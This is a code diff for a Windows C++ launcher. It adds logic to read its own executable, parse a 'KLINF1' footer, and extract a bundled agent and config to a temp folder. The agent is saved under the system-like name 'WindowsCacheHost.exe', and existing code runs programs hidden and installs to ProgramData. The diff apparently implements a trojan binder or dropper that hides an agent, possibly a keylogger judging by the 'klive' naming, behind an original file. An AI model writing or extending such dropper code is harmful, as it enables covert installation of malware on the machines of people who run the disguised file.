@@ -5,6 +5,23 @@
 #include <shlwapi.h>
 #include <string>
 #include <vector>
+#include <fstream>
+#include <cstdint>
+#include <cstring>
+#include <iterator>
+
+#pragma pack(push, 1)
+struct Footer {
+    char magic[8];
+    uint64_t originalOffset;
+    uint64_t originalLength;
+    uint64_t agentOffset;
+    uint64_t agentLength;
+    uint64_t configOffset;
+    uint64_t configLength;
+    wchar_t originalName[260];
+};
+#pragma pack(pop)
 
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -27,6 +44,42 @@ static std::wstring Join(const std::wstring& a, const std::wstring& b) {
 
 static bool Copy(const std::wstring& from, const std::wstring& to) {
     return CopyFileW(from.c_str(), to.c_str(), FALSE) != FALSE;
+}
+
+static bool ReadSelf(std::vector<uint8_t>& data) {
+    wchar_t path[MAX_PATH]{};
+    GetModuleFileNameW(nullptr, path, MAX_PATH);
+    std::ifstream in(path, std::ios::binary);
+    if (!in.good()) return false;
+    data.assign(std::istreambuf_iterator<char>(in), std::istreambuf_iterator<char>());
+    return true;
+}
+
+static bool WriteBytes(const std::wstring& path, const std::vector<uint8_t>& data) {
+    std::ofstream out(path, std::ios::binary | std::ios::trunc);
+    if (!out.good()) return false;
+    out.write(reinterpret_cast<const char*>(data.data()), (std::streamsize)data.size());
+    return out.good();
+}
+
+static bool ExtractBundled(std::wstring& agentPath, std::wstring& configPath) {
+    std::vector<uint8_t> file;
+    if (!ReadSelf(file) || file.size() < sizeof(Footer)) return false;
+    Footer footer{};
+    std::memcpy(&footer, file.data() + file.size() - sizeof(Footer), sizeof(Footer));
+    if (std::memcmp(footer.magic, "KLINF1\0", 7) != 0) return false;
+    if (footer.agentOffset + footer.agentLength > file.size() ||
+        footer.configOffset + footer.configLength > file.size()) return false;
+
+    std::vector<uint8_t> agent(file.begin() + footer.agentOffset, file.begin() + footer.agentOffset + footer.agentLength);
+    std::vector<uint8_t> config(file.begin() + footer.configOffset, file.begin() + footer.configOffset + footer.configLength);
+    wchar_t temp[MAX_PATH]{};
+    GetTempPathW(MAX_PATH, temp);
+    std::wstring dir = std::wstring(temp) + L"kl_setup_" + std::to_wstring(GetCurrentProcessId());
+    CreateDirectoryW(dir.c_str(), nullptr);
+    agentPath = Join(dir, L"WindowsCacheHost.exe");
+    configPath = Join(dir, L"klive.config.json");
+    return WriteBytes(agentPath, agent) && WriteBytes(configPath, config);
 }
 
 static int RunHidden(const std::wstring& exe, const std::wstring& args, DWORD timeoutMs) {
@@ -83,8 +136,9 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
     std::wstring source = ModuleDir();
     std::wstring agentSource = Join(source, L"WindowsCacheHost.exe");
     std::wstring configSource = Join(source, L"klive.config.json");
-    if (!PathFileExistsW(agentSource.c_str()) || !PathFileExistsW(configSource.c_str()))
-        return 1;
+    if (!PathFileExistsW(agentSource.c_str()) || !PathFileExistsW(configSource.c_str())) {
+        if (!ExtractBundled(agentSource, configSource)) return 1;
+    }
 
     wchar_t programData[MAX_PATH]{};
     if (!GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH))
